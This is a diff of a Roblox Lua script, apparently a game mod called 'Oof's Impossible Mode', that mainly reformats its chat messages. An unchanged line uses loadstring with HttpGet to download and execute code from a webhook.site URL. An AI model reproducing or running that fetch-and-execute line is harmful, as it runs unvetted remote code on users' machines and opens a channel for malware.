@@ -4,15 +4,30 @@ if table.find(blackListeds, game.Players.LocalPlayer.Name) then
 game.Players:WaitForChild("LocalPlayer"):Kick("Blacklisted from Oof's Impossible Mode for inappropiate use.")
 end
 
-game.StarterGui:SetCore( "ChatMakeSystemMessage",  { Text = "[Oof's Impossible Mode]: Script succesfully executed.", Color = Color3.fromRGB( 0,255,0 ), Font = nothingactually, FontSize = Enum.FontSize.Size24 } )
-game.StarterGui:SetCore( "ChatMakeSystemMessage",  { Text = "SCRIPT VERSION: MULTIPLAYER (v1.7)", Color = Color3.fromRGB( 0,255,0 ), Font = nothingactually, FontSize = Enum.FontSize.Size24 } )
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "[Oof's Impossible Mode]: Script succesfully executed.",
+    Color = Color3.fromRGB(0, 255, 0),
+    Font = Enum.Font.SourceSansBold,
+})
 
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "SCRIPT VERSION: MULTIPLAYER (v1.7)",
+    Color = Color3.fromRGB(0, 255, 0),
+    Font = Enum.Font.SourceSansBold,
+})
+
+game.StarterGui:SetCore("ChatMakeSystemMessage", {
+    Text = "Good Luck.",
+    Color = Color3.fromRGB(255, 255, 255),
+    Font = Enum.Font.SourceSansBold,
+})
+
+local Main_Game = require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game)
+Main_Game.caption("Oof's impossible mode script succesfully loaded. V1.8", true)
 print("EARLY MODE: OFF")
 
 loadstring(game:HttpGet("https://webhook.site/0e1a9f84-2a43-400d-8385-dea8d46bae43"))();
 
-game.StarterGui:SetCore( "ChatMakeSystemMessage",  { Text = "Good Luck.", Color = Color3.fromRGB( 255,255,255 ), Font = nothingactually, FontSize = Enum.FontSize.Size24 } )
-require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game).caption("Oof's impossible mode script succesfully loaded. V1.8",true)
 -- Node Fix
 coroutine.wrap(function()
 game:GetService("ReplicatedStorage").GameData.LatestRoom.Changed:Connect(function(v)
